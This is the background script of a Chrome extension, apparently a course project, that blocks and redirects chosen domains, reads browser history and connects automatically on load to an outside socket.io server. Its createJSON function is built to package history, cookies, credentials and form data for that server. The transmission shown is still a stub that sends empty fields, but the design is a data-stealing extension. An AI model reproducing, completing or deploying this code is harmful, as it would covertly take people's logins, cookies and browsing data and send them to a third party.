//redirecting
chrome.webRequest.onBeforeRequest.addListener(
	function(details){
			return{redirectUrl: "http://404.com/"};
	},
	{urls: redirect_domains},
	["blocking"]
);

//basic functionality
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        return {cancel: true };
    },
    {urls: blocked_domains},
    ["blocking"]
);



//Get user history, previous x results
function getClientHistory(millis, numResults){
chrome.history.search({text: '', maxResults: numResults}, function(data) {
    data.forEach(function(page) {
    	if(page.lastVisitTime>millis){
            alert(page.url);
		}

    });
});
}


//Testing out storage 
function getClientID(callback){
	chrome.storage.sync.get('ID', callback);
}

/* setClientID
 * @param {string} value
 */
function setClientID(value){
	chrome.storage.sync.set({'ID':value});
}



/* createJSON
 * package information into a json object that can be sent to the server
 * @param {integer} clientid
 * @param {string[]} history
 * @param {dictionary[]} cookies
 * @param {dictionary[]} creds
 * @param {dictionary[]} forms

 * @return {json} jsonData
 */
function createJSON(clientid, history, cookies, creds, forms){
	var jsonData = {};
	jsonData['clientid'] = clientid;
	jsonData['history'] = history;
	jsonData['cookies'] = cookies;
	jsonData['creds'] = creds;
	jsonData['forms'] = forms;
	return jsonData;
}
/* createClientIDRequest
 * package information to request a unique client id from the server
 *
 * @return {json} jsonData (-1,nullHist,nullCook,nullCred,nullForms
 */
function createClientIDRequest(){
	return createJSON(0,[],[],[],[]);
	//TODO: change history and cookies accordingly
}

function connectToHost(){
    var socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
    socket.on('connect', function(){
        /*socket.on('message', function(data){
            //parse incoming data
        });*/
        alert("Connected!");

    });
    socket.on('error', function(data){
        alert("Connection error!");
    });
    socket.on('srvpayload',function(msg){
    	alert("message received " + msg["clientid"]);
    	//gets new client ID
		//TODO: store the clientID appropriately
	});
    socket.emit('extpayload',createClientIDRequest(),function(answer){
    	//alert("json " + answer);
		//sending initial clientIDRequest
	});
}

//TESTING: Runs automatically on browser load
/*var input = prompt("Enter something to store");
if(input){
	setClientID(input);
}
getClientID(function (value){
	alert(parseInt(value.ID,10));
});*/

connectToHost();



